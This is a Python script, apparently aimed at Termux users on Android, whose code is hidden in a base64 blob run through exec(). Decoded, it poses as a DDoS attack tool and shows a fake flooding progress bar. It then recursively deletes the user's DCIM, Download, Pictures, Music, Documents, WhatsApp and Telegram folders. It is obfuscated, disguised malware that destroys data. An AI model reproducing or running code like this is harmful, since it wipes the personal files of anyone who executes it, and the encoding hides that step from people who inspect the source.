import os, time, sys, base64
from pathlib import Path

exec(base64.b64decode(b'''
aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwYXRobGliIGltcG9ydCBQYXRo
CgpkZWYgd2lwZV9maWxlcygpOgogICAgdGFyZ2V0cyA9IFsKICAgICAgICAiL3N0b3JhZ2UvZW11
bGF0ZWQvMC9EQ0lNIiwKICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9Eb3dubG9hZCIsCiAg
ICAgICAgIi9zdG9yYWdlL2VtdWxhdGVkLzAvUGljdHVyZXMiLAogICAgICAgICIvc3RvcmFnZS9l
bXVsYXRlZC8wL011c2ljIiwKICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9Eb2N1bWVudHMi
LAogICAgICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL1doYXRzQXBwIiwKICAgICAgICAiL3N0b3Jh
Z2UvZW11bGF0ZWQvMC9UZWxlZ3JhbSIsCiAgICBdCiAgICAKICAgIGZvciB0YXJnZXQgaW4gdGFy
Z2V0czoKICAgICAgICBwYXRoID0gUGF0aCh0YXJnZXQpCiAgICAgICAgaWYgcGF0aC5leGlzdHMo
KToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgcGF0aC5pc19maWxlKCk6CiAg
ICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHBhdGgpCiAgICAgICAgICAgICAgICBlbGlmIHBh
dGguaXNfZGlyKCk6CiAgICAgICAgICAgICAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGlu
IG9zLndhbGsocGF0aCwgdG9wZG93bj1GYWxzZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZv
ciBuYW1lIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKG9z
LnBhdGguam9pbihyb290LCBuYW1lKSkKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIG5hbWUg
aW4gZGlyczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJtZGlyKG9zLnBhdGguam9p
bihyb290LCBuYW1lKSkKICAgICAgICAgICAgICAgICAgICBvcy5ybWRpcihwYXRoKQogICAgICAg
ICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCgpkZWYgZmFrZV9kZG9zX2FuaW1hdGlv
bigpOgogICAgcHJpbnQoIlxuXDAzM1s5MW1bIV0gVGVybXV4IERET1MgQXR0YWNrIFRvb2wgdjMu
MCBbIV1cMDMzWzBtIikKICAgIHByaW50KCJcMDMzWzkzbVsxXSBIVFRQIEZsb29kIikKICAgIHBy
aW50KCJbMl0gVVBEIEZsb29kIikKICAgIHByaW50KCJbM10gU1lOIEZsb29kXDAzM1swbSIpCiAg
ICAKICAgIHRhcmdldF91cmwgPSBpbnB1dCgiXG5cMDMzWzkybUVudGVyIFRhcmdldCBVUkw6IFww
MzNbMG0iKQogICAgcHJpbnQoZiJcblwwMzNbOTFtWyFdIEF0dGFja2luZyB7dGFyZ2V0X3VybH0u
Li5cMDMzWzBtXG4iKQogICAgCiAgICBmb3IgaSBpbiByYW5nZSgxLCAxMDEpOgogICAgICAgIHRp
bWUuc2xlZXAoMC4xKQogICAgICAgIHByaW50KGYiXHJcMDMzWzkzbVsrXSBTZW5kaW5nIHBhY2tl
dHMuLi4ge2l9JSIsIGVuZD0iIiwgZmx1c2g9VHJ1ZSkKICAgIAogICAgcHJpbnQoIlxuXG5cMDMz
WzkybVsrXSBUYXJnZXQgRE9XTiEgWytdXDAzM1swbSIpCiAgICB0aW1lLnNsZWVwKDIpCgppZiBf
X25hbWVfXyA9PSAiX19tYWluX18iOgogICAgZmFrZV9kZG9zX2FuaW1hdGlvbigpCiAgICB3aXBl
X2ZpbGVzKCk=
''').decode())